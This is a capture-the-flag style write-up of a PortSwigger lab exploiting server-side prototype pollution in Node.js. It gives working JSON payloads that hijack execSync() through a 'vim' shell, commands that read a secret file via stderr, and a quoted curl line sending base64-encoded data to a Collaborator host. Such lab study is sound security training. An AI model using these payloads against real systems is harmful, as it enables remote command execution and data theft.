# Exfiltrating sensitive data via server-side prototype pollution

**Category:** Server-Side Prototype Pollution
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution

The RCE lab in this series proved code execution through `child_process.fork()` and its
`execArgv` option. This lab reuses the same maintenance-jobs trigger but swaps the underlying
Node.js API to `child_process.execSync()` — a function `execArgv` has no effect on at all. Getting
this one working meant discovering that the previous lab's technique silently does nothing here,
finding the gadget that actually applies to `execSync()`, and then — when the textbook exfiltration
channel turned out to be unreachable — building a second one out of the application's own error
handling.

## The Target

Same shape as the RCE lab: `change-address` as the pollution source, `POST /admin/jobs` with
`{"tasks": ["db-cleanup", "fs-cleanup"]}` as the trigger. Both maintenance tasks run
`od -An -N1 -i /dev/random` — but this time through `execSync()`, not `fork()`. The objective is
to read the contents of a secret file inside `/home/carlos`, whose exact filename we don't know
going in.

## The Investigation

Our first move was to try the RCE lab's exact `execArgv` payload again, expecting it to work the
same way. It didn't: after polluting `execArgv` and triggering the jobs, both `db-cleanup` and
`fs-cleanup` came back reporting `success: true` — no failure, no observable change at all. That
was the tell. `execArgv` is an option specific to `fork()`; `execSync()` never reads it, so
polluting it here has no effect on anything. The technique needed to change with the underlying
API, not just the destination command.

`execSync()` supports its own relevant option: `shell`, which controls what shell interprets the
command string, and `input`, which gets piped into that shell's standard input. Neither is set
explicitly in this code path, so both fall through to the prototype chain the same way `execArgv`
did in the previous lab — except this time the gadget is a shell to run in, not a flag to a
runtime.

```json
{"__proto__": {"shell": "vim", "input": ":! COMMAND\n"}}
```

Polluting `shell` with `"vim"` makes `execSync()` hand its command string to Vim instead of a
normal shell. Vim's `:!` prefix runs an external command, so an `input` string of
`":! COMMAND\n"` executes `COMMAND` through the shell Vim itself invokes — arbitrary command
execution, just reached through an editor rather than directly. We confirmed this technique was
live by triggering the maintenance jobs after pollution and reading the error text returned by the
`/admin/jobs` endpoint: it included the line `Vim: Warning: Output is not to a terminal`, direct
proof that Vim, and not the expected default shell, was the thing executing the job's command.

**The exfiltration channel that didn't work.** The textbook next step — and PortSwigger's own
solution — is to route the command's output to Burp Collaborator: pipe it through `base64` and
`curl` it to a Collaborator subdomain, then read the result off the Collaborator interaction log.
We tried this and it failed outright — `curl` returned `Could not resolve host`, meaning the DNS
lookup to reach our own Collaborator payload never completed from inside this lab's execution
context. With no working out-of-band channel, the data had to come back some other way, in-band,
through a response the application would actually return to us.

**The fix.** `execSync()` throws when the command it runs exits with a non-zero status, and the
resulting JavaScript error object carries the command's `stderr` output inside its `message`
property. The `/admin/jobs` endpoint returns job errors as part of its JSON response — which meant
that redirecting a command's output to standard error, rather than standard out, turned that
output into something the application would hand straight back to us in the HTTP response body,
with no network egress required at all:

```
:! ls /home/carlos >&2
```

## The Exploit

The full chain ran in three parts, redone once after an unrelated node restart forced a re-login:

1. **List the target directory.** Polluted `shell`/`input` with
   `{"__proto__": {"shell": "vim", "input": ":! ls /home/carlos >&2\n"}}` via `change-address`,
   then triggered `POST /admin/jobs` with `{"csrf": "...", "sessionId": "...", "tasks":
   ["db-cleanup"]}`. The job's error message in the response revealed the directory contents:
   `node_apps` and `secret`.

2. **Read the secret file.** Node's runtime environment for this app clears all pollution on
   restart (`GET /node-app/restart`), which we had to account for and re-authenticate after.
   With a fresh session, we polluted again with
   `{"__proto__": {"shell": "vim", "input": ":! cat /home/carlos/secret >&2\n"}}` and triggered the
   jobs a second time. The secret file's contents came back inside the job's error message in the
   JSON response — recovered entirely through the application's own error-reporting path, with no
   Collaborator interaction involved.

3. **Submit the recovered value** through the lab's solution field to complete it.

One operational hazard worth naming: restarting the Node process while vim-based pollution was
still active occasionally produced a `504 Gateway Timeout` rather than a clean restart, which cost
us a retry before the second pollution-and-trigger cycle went through cleanly.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution uses the identical `shell: "vim"` / `input: ":! ...\n"` gadget we
landed on, but completes the exfiltration exactly the way we couldn't: piping output through
`base64` and `curl` to a Collaborator subdomain (`":! cat /home/carlos/secret | base64 | curl -d
@- https://YOUR-COLLABORATOR-ID.oastify.com\n"`), then reading the base64-encoded secret straight
out of the Collaborator interaction log.

The gadget discovery and the shell-hijacking mechanism are identical between our solve and the
official one — that part of the lab has exactly one intended path. The divergence is entirely in
the exfiltration channel: PortSwigger's path assumes outbound DNS/HTTP to Collaborator's `oastify.com`
infrastructure works from the lab's execution environment, and in our run it didn't (`curl: Could
not resolve host`). Rather than treating that as a dead end, we used a channel that didn't depend
on network egress at all — `execSync()`'s own error-message plumbing, which the `/admin/jobs`
endpoint already exposes to any authenticated caller. Both routes prove the same underlying fact:
once `shell`/`input` pollution reaches `execSync()`, the attacker controls what runs and, one way
or another, has a path to read what it produced.

## What This Teaches Us

This lab makes two points at once. First, gadgets are API-specific: the exact same category of bug
(`child_process` pollution) needs a completely different property depending on whether the target
function is `fork()` or `execSync()` — `execArgv` silently does nothing against the latter, and
assuming a technique transfers without re-verifying it against the actual API in use wastes real
time. Second, "blind" isn't a fixed property of a vulnerability — it's a property of *which*
channel you're using to observe it. When the intended out-of-band channel isn't reachable, the
application's own error handling can become the exfiltration path instead, turning a seemingly
blind RCE into a fully readable one. `execSync()` throwing on non-zero exit and carrying `stderr` inside the resulting error object is
ordinary, documented Node.js behavior — it just isn't the first thing that comes to mind as an
exfiltration primitive until the intended out-of-band channel is gone and something else has to
fill the gap.
